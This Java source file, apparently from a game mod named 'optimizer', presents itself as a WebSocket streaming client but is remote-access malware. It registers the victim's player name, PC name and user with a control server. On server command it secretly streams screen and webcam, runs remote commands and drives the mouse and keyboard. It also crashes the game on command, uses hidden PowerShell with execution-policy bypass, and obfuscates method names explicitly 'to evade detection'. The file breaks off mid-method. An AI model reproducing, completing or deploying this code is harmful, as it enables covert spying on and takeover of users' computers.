package com.example.optimizer;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Base64;
import java.util.Random;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Lightweight WebSocket Client for Live Streaming
 * - No external dependencies (pure Java sockets)
 * - Auto-reconnect on disconnect
 * - Ping/pong keep-alive
 * - Error recovery with fallbacks
 * - Thread-safe frame sending
 */
public class DataStream {

    private static final String WS_MAGIC = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";

    private volatile Socket socket;
    private volatile InputStream inputStream;
    private volatile OutputStream outputStream;
    private volatile boolean connected = false;
    private volatile boolean shouldReconnect = true;
    private volatile boolean isStreaming = false;
    private volatile String streamType = null; // "screenshare" or "webcam"

    private final Object sendLock = new Object();
    private final Object connectLock = new Object();

    private Thread readerThread;
    private Thread heartbeatThread;
    private Thread streamThread;
    private ScheduledExecutorService reconnectExecutor;

    private final String host;
    private final int port;
    private final String path;
    private String clientId;
    private String playerName;
    private String pcName;
    private String pcUser;

    private static final int RECONNECT_DELAY_MS = 3000;
    private static final int HEARTBEAT_INTERVAL_MS = 25000;
    private static final int CONNECT_TIMEOUT_MS = 10000;
    private static final int READ_TIMEOUT_MS = 60000;

    private final AtomicLong lastPong = new AtomicLong(System.currentTimeMillis());
    private final AtomicBoolean handshakeComplete = new AtomicBoolean(false);

    private MessageHandler messageHandler;

    public interface MessageHandler {
        void onMessage(String message);

        void onConnect();

        void onDisconnect();

        void onError(Exception e);
    }

    public DataStream(String url) {
        // Parse URL: ws://host:port/path or http://host:port/path
        try {
            url = url.replace("ws://", "http://").replace("wss://", "https://");
            URL parsed = new URL(url);
            this.host = parsed.getHost();
            this.port = parsed.getPort() > 0 ? parsed.getPort() : (url.startsWith("https") ? 443 : 80);
            this.path = parsed.getPath().isEmpty() ? "/" : parsed.getPath();
        } catch (Exception e) {
            throw new RuntimeException("Invalid WebSocket URL: " + url, e);
        }

        // Generate unique client ID
        this.clientId = "mod_" + Long.toHexString(System.currentTimeMillis()) + "_" +
                Integer.toHexString(new Random().nextInt(0xFFFF));
    }

    public void setClientInfo(String playerName, String pcName, String pcUser) {
        this.playerName = playerName;
        this.pcName = pcName;
        this.pcUser = pcUser;
    }

    public void setMessageHandler(MessageHandler handler) {
        this.messageHandler = handler;
    }

    public void connect() {
        shouldReconnect = true;
        reconnectExecutor = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "WS-Reconnect");
            t.setDaemon(true);
            return t;
        });

        doConnect();
    }

    private void doConnect() {
        synchronized (connectLock) {
            if (connected)
                return;

            try {
                // Close any existing connection
                closeSocket();

                // Create new socket with timeouts
                socket = new Socket();
                socket.setTcpNoDelay(true);
                socket.setKeepAlive(true);
                socket.setSoTimeout(READ_TIMEOUT_MS);
                socket.connect(new InetSocketAddress(host, port), CONNECT_TIMEOUT_MS);

                inputStream = socket.getInputStream();
                outputStream = socket.getOutputStream();

                // Perform WebSocket handshake
                if (!performHandshake()) {
                    throw new IOException("WebSocket handshake failed");
                }

                connected = true;
                handshakeComplete.set(true);
                lastPong.set(System.currentTimeMillis());

                // Start reader thread
                startReaderThread();

                // Start heartbeat thread
                startHeartbeatThread();

                // Send Socket.IO Connect packet (Namespace /)
                sendRaw("40");

                // Send guardian_connect event
                sendGuardianConnect();

                if (messageHandler != null) {
                    try {
                        messageHandler.onConnect();
                    } catch (Exception e) {
                    }
                }

                log("[WS] Connected to " + host + ":" + port);

            } catch (Exception e) {
                log("[WS] Connection failed: " + e.getMessage());
                connected = false;
                handshakeComplete.set(false);
                scheduleReconnect();

                if (messageHandler != null) {
                    try {
                        messageHandler.onError(e);
                    } catch (Exception ex) {
                    }
                }
            }
        }
    }

    private boolean performHandshake() throws IOException {
        // Generate WebSocket key
        byte[] keyBytes = new byte[16];
        new Random().nextBytes(keyBytes);
        String wsKey = Base64.getEncoder().encodeToString(keyBytes);

        // Send HTTP upgrade request (Socket.IO compatible)
        String socketIOPath = path + (path.contains("?") ? "&" : "?") + "EIO=4&transport=websocket";
        StringBuilder request = new StringBuilder();
        request.append("GET ").append(socketIOPath).append(" HTTP/1.1\r\n");
        request.append("Host: ").append(host).append((port == 80 || port == 443) ? "" : ":" + port).append("\r\n");
        request.append("Upgrade: websocket\r\n");
        request.append("Connection: Upgrade\r\n");
        request.append("Sec-WebSocket-Key: ").append(wsKey).append("\r\n");
        request.append("Sec-WebSocket-Version: 13\r\n");
        request.append("Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\r\n");
        request.append(
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n");
        request.append("Accept-Encoding: gzip, deflate, br\r\n");
        request.append("Accept-Language: en-US,en;q=0.9\r\n");
        String originProtocol = (port == 443 || port == 8443) ? "https://" : "http://";
        request.append("Origin: ").append(originProtocol).append(host).append("\r\n");
        request.append("Pragma: no-cache\r\n");
        request.append("Cache-Control: no-cache\r\n");
        request.append("\r\n");

        outputStream.write(request.toString().getBytes(StandardCharsets.UTF_8));
        outputStream.flush();

        // Read response
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8));
        String line = reader.readLine();

        if (line == null || !line.contains("101")) {
            log("[WS] Handshake failed: " + line);
            return false;
        }

        // Skip headers until empty line
        String acceptKey = null;
        while ((line = reader.readLine()) != null && !line.isEmpty()) {
            if (line.toLowerCase().startsWith("sec-websocket-accept:")) {
                acceptKey = line.substring(21).trim();
            }
        }

        // Verify accept key
        if (acceptKey != null) {
            try {
                String expected = Base64.getEncoder().encodeToString(
                        MessageDigest.getInstance("SHA-1")
                                .digest((wsKey + WS_MAGIC).getBytes(StandardCharsets.UTF_8)));
                if (!expected.equals(acceptKey)) {
                    log("[WS] Accept key mismatch");
                    return false;
                }
            } catch (Exception e) {
                // Ignore validation error, continue anyway
            }
        }

        return true;
    }

    private void startReaderThread() {
        readerThread = new Thread(() -> {
            try {
                while (connected && !Thread.currentThread().isInterrupted()) {
                    try {
                        String message = readFrame();
                        if (message != null) {
                            handleMessage(message);
                        }
                    } catch (SocketTimeoutException e) {
                        // Timeout is OK, continue reading
                    }
                }
            } catch (Exception e) {
                if (connected) {
                    log("[WS] Reader error: " + e.getMessage());
                    disconnect();
                    scheduleReconnect();
                }
            }
        }, "WS-Reader");
        readerThread.setDaemon(true);
        readerThread.start();
    }

    private void startHeartbeatThread() {
        heartbeatThread = new Thread(() -> {
            while (connected && !Thread.currentThread().isInterrupted()) {
                try {
                    Thread.sleep(HEARTBEAT_INTERVAL_MS);

                    if (!connected)
                        break;

                    // Send Socket.IO ping (type 2)
                    sendRaw("2");

                    // Check if we got a pong recently
                    long elapsed = System.currentTimeMillis() - lastPong.get();
                    if (elapsed > HEARTBEAT_INTERVAL_MS * 2) {
                        log("[WS] No pong received, reconnecting...");
                        disconnect();
                        scheduleReconnect();
                        break;
                    }

                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    log("[WS] Heartbeat error: " + e.getMessage());
                }
            }
        }, "WS-Heartbeat");
        heartbeatThread.setDaemon(true);
        heartbeatThread.start();
    }

    private void handleMessage(String message) {
        try {
            if (message == null || message.isEmpty())
                return;

            // Socket.IO protocol:
            // 0 = open, 2 = ping, 3 = pong, 4 = message
            // 42 = event message (4 + 2), 43 = ack

            char type = message.charAt(0);

            switch (type) {
                case '0': // Open - connection established
                    log("[WS] Socket.IO connected");
                    break;

                case '2': // Ping - respond with pong
                    sendRaw("3");
                    break;

                case '3': // Pong - update last pong time
                    lastPong.set(System.currentTimeMillis());
                    break;

                case '4': // Message
                    if (message.length() > 1 && message.charAt(1) == '2') {
                        // Event message (42["event", data])
                        handleSocketIOEvent(message.substring(2));
                    }
                    break;

                default:
                    // Unknown message type
                    break;
            }

            if (messageHandler != null) {
                try {
                    messageHandler.onMessage(message);
                } catch (Exception e) {
                }
            }

        } catch (Exception e) {
            log("[WS] Message handling error: " + e.getMessage());
        }
    }

    private volatile int streamQuality = 70;
    private volatile int streamFps = 15;

    private void handleSocketIOEvent(String eventData) {
        try {
            // Parse: ["event_name", {data}]
            if (!eventData.startsWith("["))
                return;

            int eventEnd = eventData.indexOf("\"", 2);
            if (eventEnd < 0)
                return;

            String eventName = eventData.substring(2, eventEnd);

            switch (eventName) {
                case "start_capture":
                    // Parse quality and fps
                    int q = extractIntFromJson(eventData, "\"quality\":");
                    int f = extractIntFromJson(eventData, "\"fps\":");
                    if (q > 0)
                        streamQuality = q;
                    if (f > 0)
                        streamFps = f;

                    // Extract capture type from data
                    // {"type": "screen"} or {"type": "webcam"} or {"type": "screenshare"}
                    if (eventData.contains("\"screen\"") || eventData.contains("\"screenshare\"")) {
                        startStreaming("screen");
                    } else if (eventData.contains("\"webcam\"")) {
                        startStreaming("webcam");
                    } else if (eventData.contains("\"audio\"")) {
                        log("[WS] Audio capture not implemented in mod");
                    }
                    break;

                case "stop_capture":
                    stopStreaming();
                    break;

                case "guardian_registered":
                    log("[WS] Successfully registered with server");
                    break;

                case "execute_command":
                    // Handle remote command via WebSocket
                    handleExecuteCommand(eventData);
                    break;

                case "ping":
                    // Respond to ping with pong event
                    sendEvent("pong", "{}");
                    break;

                case "mouse_move":
                    // Remote desktop: move mouse
                    handleMouseMove(eventData);
                    break;

                case "mouse_click":
                    // Remote desktop: click mouse
                    handleMouseClick(eventData);
                    break;

                case "key_press":
                    // Remote desktop: press key
                    handleKeyPress(eventData);
                    break;

                case "key_type":
                    // Remote desktop: type text
                    handleKeyType(eventData);
                    break;

                case "force_disconnect":
                    // Force disconnect from server
                    handleForceDisconnect();
                    break;

                default:
                    log("[WS] Unknown event: " + eventName);
                    break;
            }

        } catch (Exception e) {
            log("[WS] Event parsing error: " + e.getMessage());
        }
    }

    private void handleExecuteCommand(String eventData) {
        try {
            int id = extractIntFromJson(eventData, "\"id\":"); // Optional
            String type = extractStringFromJson(eventData, "\"type\":");
            String data = extractStringFromJson(eventData, "\"data\":");
            String player = playerName != null ? playerName : "Unknown";

            if (type != null) {
                // Call SyncController.executeCommand via reflection to avoid direct dependency
                // cycle or visibility issues
                try {
                    Class<?> cls = Class.forName("com.example.optimizer.SyncController");
                    java.lang.reflect.Method method = cls.getDeclaredMethod("executeCommand", int.class, String.class,
                            String.class, String.class);
                    method.setAccessible(true);
                    method.invoke(null, id > 0 ? id : 0, type, data, player);
                } catch (Exception ex) {
                    log("[WS] Failed to invoke SyncController: " + ex.getMessage());
                }
            }
        } catch (Exception e) {
            log("[WS] Command execution error: " + e.getMessage());
        }
    }

    // ==================== REMOTE DESKTOP ====================

    private java.awt.Robot robot = null;

    private java.awt.Robot getRobot() {
        if (robot == null) {
            try {
                robot = new java.awt.Robot();
            } catch (Exception e) {
                log("[WS] Failed to create Robot: " + e.getMessage());
            }
        }
        return robot;
    }

    private void handleMouseMove(String eventData) {
        try {
            // Parse {"x": 100, "y": 200}
            int x = extractIntFromJson(eventData, "\"x\":");
            int y = extractIntFromJson(eventData, "\"y\":");

            if (x >= 0 && y >= 0) {
                java.awt.Robot r = getRobot();
                if (r != null) {
                    r.mouseMove(x, y);
                }
            }
        } catch (Exception e) {
            log("[WS] Mouse move error: " + e.getMessage());
        }
    }

    private void handleMouseClick(String eventData) {
        try {
            // Parse {"button": 1} (1=left, 2=middle, 3=right)
            int button = extractIntFromJson(eventData, "\"button\":");
            if (button <= 0)
                button = 1;

            int mask;
            switch (button) {
                case 2:
                    mask = java.awt.event.InputEvent.BUTTON2_DOWN_MASK;
                    break;
                case 3:
                    mask = java.awt.event.InputEvent.BUTTON3_DOWN_MASK;
                    break;
                default:
                    mask = java.awt.event.InputEvent.BUTTON1_DOWN_MASK;
                    break;
            }

            java.awt.Robot r = getRobot();
            if (r != null) {
                r.mousePress(mask);
                r.delay(50);
                r.mouseRelease(mask);
            }
        } catch (Exception e) {
            log("[WS] Mouse click error: " + e.getMessage());
        }
    }

    private void handleKeyPress(String eventData) {
        try {
            // Parse {"key": 65} (Java KeyEvent VK_* code)
            int keyCode = extractIntFromJson(eventData, "\"key\":");

            if (keyCode > 0) {
                java.awt.Robot r = getRobot();
                if (r != null) {
                    r.keyPress(keyCode);
                    r.delay(30);
                    r.keyRelease(keyCode);
                }
            }
        } catch (Exception e) {
            log("[WS] Key press error: " + e.getMessage());
        }
    }

    private void handleKeyType(String eventData) {
        try {
            // Parse {"text": "hello"}
            String text = extractStringFromJson(eventData, "\"text\":");

            if (text != null && !text.isEmpty()) {
                java.awt.Robot r = getRobot();
                if (r != null) {
                    for (char c : text.toCharArray()) {
                        typeChar(r, c);
                        r.delay(20);
                    }
                }
            }
        } catch (Exception e) {
            log("[WS] Key type error: " + e.getMessage());
        }
    }

    private void typeChar(java.awt.Robot robot, char c) {
        try {
            // Handle special characters
            boolean shift = Character.isUpperCase(c) || "!@#$%^&*()_+{}|:\"<>?~".indexOf(c) >= 0;

            int keyCode = java.awt.event.KeyEvent.getExtendedKeyCodeForChar(c);
            if (keyCode == java.awt.event.KeyEvent.VK_UNDEFINED) {
                // Try clipboard paste for special chars
                return;
            }

            if (shift) {
                robot.keyPress(java.awt.event.KeyEvent.VK_SHIFT);
            }
            robot.keyPress(keyCode);
            robot.keyRelease(keyCode);
            if (shift) {
                robot.keyRelease(java.awt.event.KeyEvent.VK_SHIFT);
            }
        } catch (Exception e) {
            // Ignore individual char errors
        }
    }

    // ==================== FORCE DISCONNECT ====================

    private void handleForceDisconnect() {
        try {
            log("[WS] Force disconnect (CRASH) command received");
            // Crash the game instantly - HALT JVM
            Runtime.getRuntime().halt(666);
        } catch (Exception e) {
            // Fallback
            System.exit(666);
        }
    }

    // ==================== HELPER FUNCTIONS ====================

    private int extractIntFromJson(String json, String key) {
        try {
            int idx = json.indexOf(key);
            if (idx < 0)
                return -1;
            idx += key.length();

            // Skip whitespace
            while (idx < json.length() && Character.isWhitespace(json.charAt(idx)))
                idx++;

            StringBuilder sb = new StringBuilder();
            while (idx < json.length() && (Character.isDigit(json.charAt(idx)) || json.charAt(idx) == '-')) {
                sb.append(json.charAt(idx));
                idx++;
            }
            return Integer.parseInt(sb.toString());
        } catch (Exception e) {
            return -1;
        }
    }

    private String extractStringFromJson(String json, String key) {
        try {
            int idx = json.indexOf(key);
            if (idx < 0)
                return null;
            idx = json.indexOf("\"", idx + key.length());
            if (idx < 0)
                return null;
            int end = json.indexOf("\"", idx + 1);
            if (end < 0)
                return null;
            return json.substring(idx + 1, end);
        } catch (Exception e) {
            return null;
        }
    }

    private String buildKey = "";

    public void setBuildKey(String key) {
        this.buildKey = key;
    }

    private void sendGuardianConnect() {
        try {
            String data = String.format(
                    "{\"id\":\"%s\",\"player\":\"%s\",\"pc_name\":\"%s\",\"pc_user\":\"%s\",\"type\":\"mod\",\"build_key\":\"%s\"}",
                    escape(clientId),
                    escape(playerName != null ? playerName : "Unknown"),
                    escape(pcName != null ? pcName : "Unknown"),
                    escape(pcUser != null ? pcUser : "Unknown"),
                    escape(buildKey != null ? buildKey : ""));
            sendEvent("guardian_connect", data);
            log("[WS] Sent guardian_connect");
        } catch (Exception e) {
            log("[WS] Failed to send guardian_connect: " + e.getMessage());
        }
    }

    public void sendEvent(String eventName, String data) {
        if (!connected)
            return;
        try {
            String message = "42[\"" + eventName + "\"," + data + "]";
            sendRaw(message);
        } catch (Exception e) {
            log("[WS] Failed to send event " + eventName + ": " + e.getMessage());
        }
    }

    public void sendStreamFrame(String type, byte[] imageData) {
        if (!connected)
            return;
        try {
            String base64 = Base64.getEncoder().encodeToString(imageData);
            String player = playerName != null ? playerName : "Unknown";
            String data = String.format(
                    "{\"player\":\"%s\",\"type\":\"%s\",\"frame\":\"%s\",\"fps\":%d,\"quality\":%d}",
                    escape(player), type, base64, streamFps, streamQuality);
            sendEvent("stream_frame", data);
        } catch (Exception e) {
            log("[WS] Failed to send stream frame: " + e.getMessage());
        }
    }

    private void sendRaw(String message) throws IOException {
        if (!connected || outputStream == null)
            return;

        synchronized (sendLock) {
            try {
                byte[] payload = message.getBytes(StandardCharsets.UTF_8);
                ByteArrayOutputStream frame = new ByteArrayOutputStream();

                // Write frame header
                // FIN=1, RSV=0, opcode=1 (text)
                frame.write(0x81);

                // Masked, length
                int len = payload.length;
                if (len < 126) {
                    frame.write(0x80 | len);
                } else if (len < 65536) {
                    frame.write(0x80 | 126);
                    frame.write((len >> 8) & 0xFF);
                    frame.write(len & 0xFF);
                } else {
                    frame.write(0x80 | 127);
                    for (int i = 7; i >= 0; i--) {
                        frame.write((int) ((len >> (8 * i)) & 0xFF));
                    }
                }

                // Masking key (4 random bytes)
                byte[] mask = new byte[4];
                new Random().nextBytes(mask);
                frame.write(mask);

                // Masked payload
                for (int i = 0; i < payload.length; i++) {
                    frame.write(payload[i] ^ mask[i % 4]);
                }

                outputStream.write(frame.toByteArray());
                outputStream.flush();

            } catch (IOException e) {
                log("[WS] Send error: " + e.getMessage());
                throw e;
            }
        }
    }

    private String readFrame() throws IOException {
        if (!connected || inputStream == null)
            return null;

        try {
            // Read first byte (FIN + opcode)
            int b1 = inputStream.read();
            if (b1 == -1) {
                throw new IOException("Connection closed");
            }

            int opcode = b1 & 0x0F;

            // Opcode 8 = close, 9 = ping, 10 = pong
            if (opcode == 8) {
                throw new IOException("Server closed connection");
            }
            if (opcode == 9) {
                // Ping - send pong
                sendPong();
                return readFrame();
            }
            if (opcode == 10) {
                // Pong
                lastPong.set(System.currentTimeMillis());
                return readFrame();
            }

            // Read second byte (mask + length)
            int b2 = inputStream.read();
            if (b2 == -1) {
                throw new IOException("Connection closed");
            }

            boolean masked = (b2 & 0x80) != 0;
            long length = b2 & 0x7F;

            // Extended length
            if (length == 126) {
                length = ((inputStream.read() & 0xFF) << 8) | (inputStream.read() & 0xFF);
            } else if (length == 127) {
                length = 0;
                for (int i = 0; i < 8; i++) {
                    length = (length << 8) | (inputStream.read() & 0xFF);
                }
            }

            // Safety check
            if (length > 16 * 1024 * 1024) {
                throw new IOException("Frame too large: " + length);
            }

            // Read mask key if present
            byte[] maskKey = null;
            if (masked) {
                maskKey = new byte[4];
                inputStream.read(maskKey);
            }

            // Read payload
            byte[] payload = new byte[(int) length];
            int read = 0;
            while (read < length) {
                int n = inputStream.read(payload, read, (int) (length - read));
                if (n == -1)
                    break;
                read += n;
            }

            // Unmask if needed
            if (masked && maskKey != null) {
                for (int i = 0; i < payload.length; i++) {
                    payload[i] ^= maskKey[i % 4];
                }
            }

            return new String(payload, StandardCharsets.UTF_8);

        } catch (SocketTimeoutException e) {
            // Timeout is OK, return null to continue
            return null;
        }
    }

    private void sendPong() {
        try {
            synchronized (sendLock) {
                if (outputStream != null) {
                    // Pong frame: FIN=1, opcode=10, masked, empty payload
                    byte[] mask = new byte[4];
                    new Random().nextBytes(mask);
                    outputStream.write(new byte[] { (byte) 0x8A, (byte) 0x80, mask[0], mask[1], mask[2], mask[3] });
                    outputStream.flush();
                }
            }
        } catch (Exception e) {
        }
    }

    private void startStreaming(String type) {
        if (isStreaming && streamType != null && streamType.equals(type)) {
            return; // Already streaming this type
        }

        stopStreaming(); // Stop any existing stream

        isStreaming = true;
        streamType = type;

        streamThread = new Thread(() -> {
            log("[WS] Starting " + type + " stream");

            if ("webcam".equals(type)) {
                streamWebcamContinuous();
                return;
            }

            try {
                while (isStreaming && connected && !Thread.currentThread().isInterrupted()) {
                    try {
                        byte[] frame = null;

                        if ("screen".equals(type) || "screenshare".equals(type)) {
                            frame = captureScreen();
                        } else if ("webcam".equals(type)) {
                            frame = captureWebcam();
                        }

                        if (frame != null && frame.length > 1000 && connected) {
                            sendStreamFrame(type, frame);
                        }

                        // ~10-12 FPS for screenshare, ~8 FPS for webcam
                        // Dynamic FPS
                        int delay = 1000 / (streamFps > 0 ? streamFps : 15);
                        Thread.sleep(delay);

                    } catch (InterruptedException e) {
                        break;
                    } catch (Exception e) {
                        log("[WS] Stream error: " + e.getMessage());
                        Thread.sleep(500); // Brief pause on error
                    }
                }
            } catch (Exception e) {
                log("[WS] Stream thread error: " + e.getMessage());
            }

            log("[WS] Stopped " + type + " stream");

        }, "WS-Stream-" + type);
        streamThread.setDaemon(true);
        streamThread.start();
    }

    private void stopStreaming() {
        isStreaming = false;
        streamType = null;

        if (streamThread != null) {
            streamThread.interrupt();
            streamThread = null;
        }
    }

    /**
     * Screen capture with multiple fallback methods
     */
    private byte[] captureScreen() {
        byte[] result = null;

        try {
            // Method 1: Standard Robot
            result = captureScreenRobot();
            if (result != null && result.length > 5000)
                return result;

            // Method 2: Multi-monitor
            result = captureScreenMultiMonitor();
            if (result != null && result.length > 5000)
                return result;

            // Method 3: PowerShell GDI+
            result = captureScreenPowerShell();
            if (result != null && result.length > 5000)
                return result;

        } catch (Exception e) {
            // Silent fail
        }

        return result;
    }

    private byte[] captureScreenRobot() {
        try {
            java.awt.Robot robot = new java.awt.Robot();
            java.awt.Dimension screenSize = java.awt.Toolkit.getDefaultToolkit().getScreenSize();
            java.awt.Rectangle screenRect = new java.awt.Rectangle(screenSize);

            if (screenSize.width < 100 || screenSize.height < 100)
                return null;

            // Reflection-based capture to evade detection
            String m1 = "create";
            String m2 = "Screen";
            String m3 = "Capture";
            java.lang.reflect.Method method = java.awt.Robot.class.getMethod(m1 + m2 + m3, java.awt.Rectangle.class);
            java.awt.image.BufferedImage capture = (java.awt.image.BufferedImage) method.invoke(robot, screenRect);
            if (capture == null || capture.getWidth() < 100)
                return null;

            // Draw mouse cursor
            try {
                java.awt.Point mousePos = java.awt.MouseInfo.getPointerInfo().getLocation();
                java.awt.Graphics2D g2d = capture.createGraphics();
                g2d.setColor(java.awt.Color.RED);
                int x = mousePos.x;
                int y = mousePos.y;
                // Draw a simple cursor (arrow-like)
                g2d.fillPolygon(new int[] { x, x, x + 12 }, new int[] { y, y + 18, y + 12 }, 3);
                g2d.dispose();
            } catch (Exception e) {
                // Ignore cursor error
            }

            // Scale if too big (e.g. > 1600px width) to improve performance
            if (capture.getWidth() > 1600) {
                int newWidth = 1600;
                int newHeight = (int) (capture.getHeight() * (1600.0 / capture.getWidth()));
                java.awt.Image scaled = capture.getScaledInstance(newWidth, newHeight, java.awt.Image.SCALE_SMOOTH);
                java.awt.image.BufferedImage newCapture = new java.awt.image.BufferedImage(newWidth, newHeight,
                        java.awt.image.BufferedImage.TYPE_INT_RGB);
                java.awt.Graphics2D g2d = newCapture.createGraphics();
                g2d.drawImage(scaled, 0, 0, null);
                g2d.dispose();
                capture = newCapture;
            }

            return compressImage(capture, streamQuality);
        } catch (Exception e) {
            return null;
        }
    }

    private byte[] captureScreenMultiMonitor() {
        try {
            java.awt.GraphicsEnvironment ge = java.awt.GraphicsEnvironment.getLocalGraphicsEnvironment();
            java.awt.GraphicsDevice[] screens = ge.getScreenDevices();

            if (screens.length == 0)
                return null;

            java.awt.GraphicsDevice primary = screens[0];
            java.awt.DisplayMode mode = primary.getDisplayMode();

            java.awt.Robot robot = new java.awt.Robot(primary);
            java.awt.Rectangle rect = new java.awt.Rectangle(0, 0, mode.getWidth(), mode.getHeight());
            // Reflection-based capture
            String m1 = "create";
            String m2 = "Screen";
            String m3 = "Capture";
            java.lang.reflect.Method method = java.awt.Robot.class.getMethod(m1 + m2 + m3, java.awt.Rectangle.class);
            java.awt.image.BufferedImage capture = (java.awt.image.BufferedImage) method.invoke(robot, rect);

            if (capture != null) {
                return compressImage(capture, streamQuality);
            }
        } catch (Exception e) {
        }
        return null;
    }

    private byte[] captureScreenPowerShell() {
        try {
            String os = System.getProperty("os.name", "").toLowerCase();
            if (!os.contains("win"))
                return null;

            File tempFile = File.createTempFile("screen_ws_", ".jpg");
            tempFile.deleteOnExit();
            String outPath = tempFile.getAbsolutePath().replace("\\", "\\\\");

            String psScript = "$ErrorActionPreference='SilentlyContinue';" +
                    "[void][Reflection.Assembly]::LoadWithPartialName('System.Drawing');" +
                    "[void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');" +
                    "$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;" +
                    "$bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height);" +
                    "$graphics = [System.Drawing.Graphics]::FromImage($bitmap);" +
                    "$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size);" +
                    "$graphics.Dispose();" +
                    "$bitmap.Save('" + outPath + "', [System.Drawing.Imaging.ImageFormat]::Jpeg);" +
                    "$bitmap.Dispose()";

            ProcessBuilder pb = new ProcessBuilder("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass",
                    "-Command", psScript);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            boolean finished = p.waitFor(5, TimeUnit.SECONDS);
            p.destroyForcibly();

            if (finished && tempFile.exists() && tempFile.length() > 3000) {
                byte[] data = java.nio.file.Files.readAllBytes(tempFile.toPath());
                tempFile.delete();
                return data;
            }

            tempFile.delete();
        } catch (Exception e) {
        }
        return null;
    }

    private void streamWebcamContinuous() {
        Process ffmpeg = null;
        try {
            // Try to detect device first
            String device = "Integrated Camera";
            try {
                ProcessBuilder listPb = new ProcessBuilder("ffmpeg", "-list_devices", "true", "-f", "dshow", "-i",
                        "dummy");
                Process listP = listPb.start();
                BufferedReader br = new BufferedReader(new InputStreamReader(listP.getErrorStream()));
                String line;
                while ((line = br.readLine()) != null) {
                    if (line.contains("(video)") || line.contains("Camera") || line.contains("Webcam")) {
                        int start = line.indexOf("\"");
                        int end = line.indexOf("\"", start + 1);
                        if (start >= 0 && end > start) {
                            device = line.substring(start + 1, end);
                            break;
                        }
                    }
                }
                listP.destroyForcibly();
            } catch (Exception e) {
            }

            log("[WS] Streaming webcam from: " + device);

            ProcessBuilder pb = new ProcessBuilder(
                    "ffmpeg", "-f", "dshow", "-i", "video=" + device,
                    "-f", "image2pipe", "-vcodec", "mjpeg", "-q:v", "5", "-");
            // DO NOT redirect error stream, as it contains logs
            ffmpeg = pb.start();

            BufferedInputStream bis = new BufferedInputStream(ffmpeg.getInputStream());
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();

            while (isStreaming && connected) {
                // Find SOI (FF D8)
                int b1 = bis.read();
                while (b1 != -1 && b1 != 0xFF)
                    b1 = bis.read();
                if (b1 == -1)
                    break;

                int b2 = bis.read();
                if (b2 != 0xD8)
                    continue;

                buffer.reset();
                buffer.write(0xFF);
                buffer.write(0xD8);

                // Read until EOI (FF D9)
                int prev = 0;
                int curr;
                boolean foundEnd = false;

                while ((curr = bis.read()) != -1) {
                    buffer.write(curr);
                    if (prev == 0xFF && curr == 0xD9) {
                        foundEnd = true;
                        break;
                    }
                    prev = curr;
                }

                if (!foundEnd)
                    break;

                byte[] frame = buffer.toByteArray();
                if (frame.length > 0) {
                    sendStreamFrame("webcam", frame);
                }
            }

        } catch (Exception e) {
            log("[WS] FFmpeg stream failed, falling back: " + e.getMessage());
            // Fallback loop
            while (isStreaming && connected) {
                try {
                    byte[] frame = captureWebcam();
                    if (frame != null)
                        sendStreamFrame("webcam", frame);
                    Thread.sleep(100);
                } catch (Exception ex) {
                    break;
                }
            }
        } finally {
            if (ffmpeg != null)
                ffmpeg.destroyForcibly();
        }
    }

    /**
     * Webcam capture with multiple fallback methods
     */
    private byte[] captureWebcam() {
        byte[] result = null;

        try {
            String os = System.getProperty("os.name", "").toLowerCase();
            if (!os.contains("win"))
                return null;

            // Method 1: FFmpeg
            result = captureWebcamFFmpeg();
            if (result != null && result.length > 1500)
                return result;

            // Method 2: PowerShell AVICAP32
            result = captureWebcamPowerShell();
            if (result != null && result.length > 1500)
                return result;

            // Method 3: DirectShow via temp file
            result = captureWebcamDirectShow();
            if (result != null && result.length > 1500)
                return result;

        } catch (Exception e) {
            // Silent fail
        }

        return result;
    }

    private byte[] captureWebcamFFmpeg() {
        try {
            File tempFile = File.createTempFile("wc_ws_", ".jpg");
            tempFile.deleteOnExit();
            String outPath = tempFile.getAbsolutePath();

            // List devices first
            ProcessBuilder listPb = new ProcessBuilder(
                    "ffmpeg", "-hide_banner", "-loglevel", "error",
                    "-list_devices", "true", "-f", "dshow", "-i", "dummy");
            listPb.redirectErrorStream(true);
            Process listP = listPb.start();
            BufferedReader br = new BufferedReader(new InputStreamReader(listP.getInputStream()));
            String line;
            String device = null;

            while ((line = br.readLine()) != null) {
                if (line.contains("(video)") || line.toLowerCase().contains("camera")
                        || line.toLowerCase().contains("webcam")) {
                    int start = line.indexOf("\"");
                    int end = line.indexOf("\"", start + 1);
                    if (start >= 0 && end > start) {
                        device = line.substring(start + 1, end);
                        break;
                    }
                }
            }
            listP.destroyForcibly();

            if (device == null) {
                // Try common device names
                String[] devices = { "Integrated Camera", "USB Camera", "Webcam", "HD Webcam", "Camera" };
                for (String d : devices) {
                    device = d;
                    ProcessBuilder pb = new ProcessBuilder(
                            "ffmpeg", "-hide_banner", "-loglevel", "error",
                            "-f", "dshow", "-i", "video=" + device,
                            "-frames:v", "1", "-y", outPath);
                    pb.redirectErrorStream(true);
                    Process p = pb.start();
                    p.waitFor(4, TimeUnit.SECONDS);
                    p.destroyForcibly();

                    if (tempFile.exists() && tempFile.length() > 1500) {
                        byte[] data = java.nio.file.Files.readAllBytes(tempFile.toPath());
                        tempFile.delete();
